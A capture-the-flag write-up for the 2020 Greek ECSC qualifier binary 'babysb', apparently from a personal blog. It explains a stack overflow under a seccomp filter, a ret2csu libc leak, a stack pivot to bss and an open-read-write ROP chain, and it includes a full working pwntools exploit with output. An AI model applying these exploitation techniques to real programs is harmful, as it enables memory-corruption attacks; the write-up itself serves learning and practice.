# Greek ECSC Quals 2020 - Pwn - babysb  
> ***I did not manage to solve this challenge during the CTF duration,  
but I got it afterwards and gave it a try to make a write up.  
P.S.1 I got it locally.  
P.S.2 The flag is not the real one but dummy.***


First of all we check what protections are enabled.  
```sh
w3th4nds@void:~/ctfs/ecsc2020_quals/pwn$ checksec ./babysb
[*] '/home/w3th4nds/ctfs/ecsc2020_quals/pwn/babysb'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
``` 
`canary` and `PIE` are disabled, only `NX` is enabled.  

### Disassembly 
Open up **IDA** we can see there are some `seccomp` calls.  
Not knowing much about this, this repo was really helpful: https://github.com/david942j/seccomp-tools  
```asm
...
.text:0000000000400AEF call    seccomp_init ; here
.text:0000000000400AF4 xor     ecx, ecx
.text:0000000000400AF6 mov     [rbp+var_28], rax
.text:0000000000400AFA mov     rdi, [rbp+var_28]
.text:0000000000400AFE mov     esi, 7FFF0000h
.text:0000000000400B03 mov     edx, 0Fh
.text:0000000000400B08 mov     al, 0
.text:0000000000400B0A call    seccomp_rule_add ; here
...
```
The tool will give us a great help understanding what these `seccomp` rules do.  
```sh
w3th4nds@void:~/ctfs/ecsc2020_quals/pwn$ seccomp-tools dump ./babysb
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x0000000f  if (A == rt_sigreturn) goto 0011
 0009: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0011
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
 ```
 From this, we can see that only:
 * read
 * write
 * open
 * exit  
 
 can be executed, otherwise it kills the process.  
 After the `seccomp rules`, there is a `read` that can trigger an overflow.  
 ```asm
.text:0000000000400B95 call    seccomp_load
.text:0000000000400B9A xor     edi, edi        ; fd
.text:0000000000400B9C lea     rsi, [rbp+s]    ; buf
.text:0000000000400BA0 mov     edx, 400h       ; nbytes
.text:0000000000400BA5 mov     [rbp+var_48], eax
.text:0000000000400BA8 call    read
.text:0000000000400BAD xor     ecx, ecx
.text:0000000000400BAF mov     [rbp+var_50], rax
.text:0000000000400BB3 mov     eax, ecx
.text:0000000000400BB5 add     rsp, 50h
.text:0000000000400BB9 pop     rbp
.text:0000000000400BBA retn
```  
It reads up to 0x400 bytes while the buffer is only 0x28 (40dec) bytes.  

The problem is that we cannot leak an address using a `puts` or a `printf` because only `read-write-open-exit` are allowed.  
So, we need to leak a libc address using `write`.   
> *ssize_t write(int fd, const void *buf, size_t count);*  

Another problem occurs because `write` takes 3 args and the only gadgets we can get are:  
* pop rdi; ret;
* pop rsi; ret;  

We have no gadget such us `pop rdx; ret;`.  
Well, we can somehow manipulate `rdx` though.  
Taking a look at: `__libc_csu_init`
```asm
pwndbg> disass __libc_csu_init 
Dump of assembler code for function __libc_csu_init:
   0x0000000000400bc0 <+0>:	push   r15
   0x0000000000400bc2 <+2>:	push   r14
   0x0000000000400bc4 <+4>:	mov    r15d,edi
   0x0000000000400bc7 <+7>:	push   r13
   0x0000000000400bc9 <+9>:	push   r12
   0x0000000000400bcb <+11>:	lea    r12,[rip+0x2011ce]        # 0x601da0
   0x0000000000400bd2 <+18>:	push   rbp
   0x0000000000400bd3 <+19>:	lea    rbp,[rip+0x2011ce]        # 0x601da8
   0x0000000000400bda <+26>:	push   rbx
   0x0000000000400bdb <+27>:	mov    r14,rsi
   0x0000000000400bde <+30>:	mov    r13,rdx
   0x0000000000400be1 <+33>:	sub    rbp,r12
   0x0000000000400be4 <+36>:	sub    rsp,0x8
   0x0000000000400be8 <+40>:	sar    rbp,0x3
   0x0000000000400bec <+44>:	call   0x400860 <_init>
   0x0000000000400bf1 <+49>:	test   rbp,rbp
   0x0000000000400bf4 <+52>:	je     0x400c16 <__libc_csu_init+86>
   0x0000000000400bf6 <+54>:	xor    ebx,ebx
   0x0000000000400bf8 <+56>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400c00 <+64>:	mov    rdx,r13
   0x0000000000400c03 <+67>:	mov    rsi,r14
   0x0000000000400c06 <+70>:	mov    edi,r15d
   0x0000000000400c09 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x0000000000400c0d <+77>:	add    rbx,0x1
   0x0000000000400c11 <+81>:	cmp    rbx,rbp
   0x0000000000400c14 <+84>:	jne    0x400c00 <__libc_csu_init+64>
   0x0000000000400c16 <+86>:	add    rsp,0x8
   0x0000000000400c1a <+90>:	pop    rbx
   0x0000000000400c1b <+91>:	pop    rbp
   0x0000000000400c1c <+92>:	pop    r12
   0x0000000000400c1e <+94>:	pop    r13
   0x0000000000400c20 <+96>:	pop    r14
   0x0000000000400c22 <+98>:	pop    r15
   0x0000000000400c24 <+100>:	ret 
   ```
We see that we can `pop` some gadgets and then `mov` them to another registers.  
* Gadget 1: `0x400c1a` # pops
* Gadget 2: `0x400c00` # movs  

To be more precise:  
Gadget 1:  
```asm
   0x0000000000400c1a <+90>:	pop    rbx
   0x0000000000400c1b <+91>:	pop    rbp
   0x0000000000400c1c <+92>:	pop    r12
   0x0000000000400c1e <+94>:	pop    r13
   0x0000000000400c20 <+96>:	pop    r14
   0x0000000000400c22 <+98>:	pop    r15
   0x0000000000400c24 <+100>:	ret
```

Gadget 2:  
```asm
   0x0000000000400c00 <+64>:	mov    rdx,r13
   0x0000000000400c03 <+67>:	mov    rsi,r14
   0x0000000000400c06 <+70>:	mov    edi,r15d
   0x0000000000400c09 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x0000000000400c0d <+77>:	add    rbx,0x1
   0x0000000000400c11 <+81>:	cmp    rbx,rbp
   0x0000000000400c14 <+84>:	jne    0x400c00 <__libc_csu_init+64>
   0x0000000000400c16 <+86>:	add    rsp,0x8
```  
We can see that:  
* `rdx` = `r13`
* `rsi` = `r14`
* `edi` = `r15d`
* call [`r12` + `rbx`\* 8]  

We can control all these registers so we can call `write(1, addr@libc, 0x8)` and leak address of whatever func we want in order to calculate libc_base.  

Then, we are going to call `read` and "make" it write from fd to `bss`.  
`read(0, bss, 0x300)`.  
This way, we will store our payload-ropchain (up to 0x300 bytes) in the `bss` section and then we will pivot to it in order to execute it.  

The payload so far looks like this:  
```python
   # LEAK WRITE@GOT - write(1, write@GOT, 0x8)

   flag = b'./flag\x00'
   junk = flag + b'b'*(40-len(flag))

   payload =  junk            # What i want to read
   payload += p64(gadget1)    # Gadget 1 (pops)
   payload += p64(0)          # pop rbx
   payload += p64(1)          # pop rbp
   payload += p64(write_got)  # pop r12 (call write)
   payload += p64(0x8)        # pop r13 (rdx, bytes to write)
   payload += p64(write_got)  # pop r14 (rsi, what to write)
   payload += p64(1)          # pop r15 (rdi, fd)
   payload += p64(gadget2)    # ret Gadget 2 (movs + pops)

   # Ropchain - read(0, bss, 0x300)
   payload += p64(0)          # add rsp, 8
   payload += p64(0)          # pop rbx
   payload += p64(1)          # pop rbp
   payload += p64(read_got)   # pop r12
   payload += p64(0x300)      # pop r13
   payload += p64(bss_start)  # pop r14
   payload += p64(0)          # pop r15
   payload += p64(gadget2)    # ret Gadget 2 (movs + pops)
   payload += p64(0)*7        # add rsp, 8 - pops
``` 
Now we have a leak and a `read` that is open and ready to write in the `bss`.  
We need to `pivot` to the `bss` segment now.  
```python
# Stack pivot -> bss
payload += p64(pop_rsp)     # pop rsp
payload += p64(ropchain)    # ropchain address bss+0x100
```

After our call to `read`, we see that the `./flag` is stored in the `bss` as we wanted it to.  
```asm
 RAX  0x1f0
 RBX  0x0
 RCX  0x7f1fabc895ae (read+14) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x300
 RDI  0x0
 RSI  0x602010 ◂— 0x620067616c662f2e /* './flag' */
 R8   0x720010 ◂— 0x700000007
 R9   0x7
 R10  0x7
 R11  0x246
 R12  0x601fd0 (_GLOBAL_OFFSET_TABLE_+72) —▸ 0x7f1fabc895a0 (read) ◂— mov    eax, dword ptr fs:[0x18]
 R13  0x300
 R14  0x602010 ◂— 0x620067616c662f2e /* './flag' */
 R15  0x0
 RBP  0x1
 RSP  0x7ffc9b0e18e8 ◂— 0x0
 RIP  0x400c0d (__libc_csu_init+77) ◂— add    rbx, 1
──────────────────────────────────────────[ DISASM ]──────────────────────────────────────────
   0x400c24 <__libc_csu_init+100>    ret    
    ↓
   0x400c00 <__libc_csu_init+64>     mov    rdx, r13
   0x400c03 <__libc_csu_init+67>     mov    rsi, r14
   0x400c06 <__libc_csu_init+70>     mov    edi, r15d
   0x400c09 <__libc_csu_init+73>     call   qword ptr [r12 + rbx*8]
```

Even though we can calculate libc_base, we cannot execute `system` or `execve` because we are not allowed.  
We need to somehow read the flag with the 4 funcs we mentioned before.  
The plan is to:  
* `open` the flag file remotely  
* `read` it  
* `write` its content in fd 1
* `exit` (optional)  

Final plan:  
* Leak the address of a libc func, `write(1, write@got, 0x8)`
* Make `read` write our ropchain at `bss`, `read(0, bss_addr, 0x300)` 
* Stack pivot to `bss`  
* `open` the flag file remotely  
* `read` it  
* `write` its content in fd 1
* `exit` (optional) 

Another problem pops up (for me at least), because my `libc.so.6` cannot find `open`, it finds `open64` instead.  
This just kills the process because of the bad syscall.  
For this reason, we could call `syscall` in order to call `open`.  
```asm
   0x7faea3650f40 <syscall>                mov    rax, rdi
   0x7faea3650f43 <syscall+3>              mov    rdi, rsi
   0x7faea3650f46 <syscall+6>              mov    rsi, rdx
   0x7faea3650f49 <syscall+9>              mov    rdx, rcx
   0x7faea3650f4c <syscall+12>             mov    r10, r8
   0x7faea3650f4f <syscall+15>             mov    r8, r9
   0x7faea3650f52 <syscall+18>             mov    r9, qword ptr [rsp + 8]
   0x7faea3650f57 <syscall+23>             syscall 
```
This is how syscall works when called.  
In order to call `open`, we need to set registers at certain values.  
Link: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/  
What we need is:  
* `rax`: 2 (`rdi`-> 2)
* `rdi`: flag_addr (`rsi`-> flag_addr)
* `rsi`: 0 (`rdx`-> 0)  

to make a `syscall` to `open`.  
After that, we call `read` and `write` normally to print the flag.  


### Exploit
```python
#!/usr/bin/python3
from pwn import *

filename = './babysb'
_libc = '/lib/x86_64-linux-gnu/libc.so.6'

def pwn():

   r = process(filename)
   e = ELF(filename, checksec = False)
   libc = ELF(_libc)
   rop = ROP(e)
   libc_rop = ROP(libc)

   '''
   gadget 1
   0x0000000000400c1a <+90>:  pop    rbx
   0x0000000000400c1b <+91>:  pop    rbp
   0x0000000000400c1c <+92>:  pop    r12
   0x0000000000400c1e <+94>:  pop    r13
   0x0000000000400c20 <+96>:  pop    r14
   0x0000000000400c22 <+98>:  pop    r15
   0x0000000000400c24 <+100>: ret 

   gadget 2
   0x0000000000400c00 <+64>:  mov    rdx,r13
   0x0000000000400c03 <+67>:  mov    rsi,r14
   0x0000000000400c06 <+70>:  mov    edi,r15d
   0x0000000000400c09 <+73>:  call   QWORD PTR [r12+rbx*8]
   0x0000000000400c0d <+77>:  add    rbx,0x1
   0x0000000000400c11 <+81>:  cmp    rbx,rbp
   0x0000000000400c14 <+84>:  jne    0x400c00 <__libc_csu_init+64>
   0x0000000000400c16 <+86>:  add    rsp,0x8
   '''

   # Addresses of read - write - open
   write_libc = libc.symbols['write']
   write_got = e.got['write']
   write_plt = e.plt['write']
   read_got = e.got['read']
   read_plt = e.plt['read']
   exit_plt = e.plt['exit']
   syscall = libc.symbols['syscall']

   # Another gadgets
   pop_rdi = rop.find_gadget(['pop rdi'])[0]
   pop_rsi = rop.find_gadget(['pop rsi'])[0]
   pop_rsp = rop.find_gadget(['pop rsp'])[0] # For stack pivot

   flag = b'./flag\x00' # What i want to read
   junk = flag + b'b'*(40-len(flag))
   
   gadget1 = 0x400c1a
   gadget2 = 0x400c00

   # bss
   # readelf -s ./babysb
   bss_start = 0x602010 

   # Where to store the ropchain
   ropchain = bss_start + 0x100

   # Craft payload 1 for storing second ropchain and leak write@got
   
   # LEAK WRITE@GOT - write(1, write@GOT, 0x8)
   payload =  junk
   payload += p64(gadget1)    # Gadget 1 (pops)
   payload += p64(0)          # pop rbx
   payload += p64(1)          # pop rbp
   payload += p64(write_got)  # pop r12 (call write)
   payload += p64(0x8)        # pop r13 (rdx, bytes to write)
   payload += p64(write_got)  # pop r14 (rsi, what to write)
   payload += p64(1)          # pop r15 (rdi, fd)
   payload += p64(gadget2)    # ret Gadget 2 (movs + pops)

   # Ropchain - read(0, bss, 0x300)
   payload += p64(0)          # add rsp, 8
   payload += p64(0)          # pop rbx
   payload += p64(1)          # pop rbp
   payload += p64(read_got)   # pop r12
   payload += p64(0x300)      # pop r13
   payload += p64(bss_start)  # pop r14
   payload += p64(0)          # pop r15
   payload += p64(gadget2)    # ret Gadget 2 (movs + pops)

   payload += p64(0)*7        # add rsp, 8 - pops

   # Stack pivot -> bss
   payload += p64(pop_rsp)    # pop rsp
   payload += p64(ropchain)   # ropchain address

   r.send(payload)

   # Calculate libc_base from leak
   leaked = int.from_bytes(r.recv()[:8], 'little')
   base = leaked - write_libc
   log.success('Libc_base: 0x{:x}'.format(base))
   

   # OPEN - READ - WRITE
   syscall += base

   pop_rdx = base + 0xec7ed   # pop rdx; ret;

   # Junks for some pop up registers
   payload += p64(0xdeadb00b) 
   payload += p64(0xdeadbeef)  
   payload += p64(0xb00bd00d)
   payload += p64(0x69)
   payload += p64(0x6969)

   # Syscall for OPEN
   # There was a pop r15 at pop_rsi
   payload += p64(pop_rdi)
   payload += p64(0x2)
   payload += p64(pop_rsi)
   payload += p64(bss_start)
   payload += p64(0)          # pop r15
   payload += p64(pop_rdx)
   payload += p64(0)
   payload += p64(syscall)

   # READ
   payload += p64(pop_rdi)
   payload += p64(0x3)        # read from file
   payload += p64(pop_rsi)
   payload += p64(bss_start)
   payload += p64(0)          # pop r15 
   payload += p64(pop_rdx)
   payload += p64(0x30)
   payload += p64(read_plt)

   # WRITE
   payload += p64(pop_rdi)
   payload += p64(0x1)
   payload += p64(pop_rsi)
   payload += p64(bss_start)
   payload += p64(0)          # pop r15
   payload += p64(pop_rdx)
   payload += p64(0x30)
   payload += p64(write_plt)

   # EXIT like a sir
   payload += p64(pop_rdi)
   payload += p64(1)
   payload += p64(exit_plt)

   # Get flag
   r.send(payload)
   flag = r.recvuntil('}')
   log.success(flag.decode())

pwn()

```
```sh
w3th4nds@void:~/ctfs/ecsc2020_quals/pwn$ ./exp.py 
[+] Starting local process './babysb': pid 3950
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 17 cached gadgets for './babysb'
[*] Loaded 196 cached gadgets for '/lib/x86_64-linux-gnu/libc.so.6'
[+] Libc_base: 0x7fdd2e7c6000
[+] HTB{dummy_flag_for_babysb}
```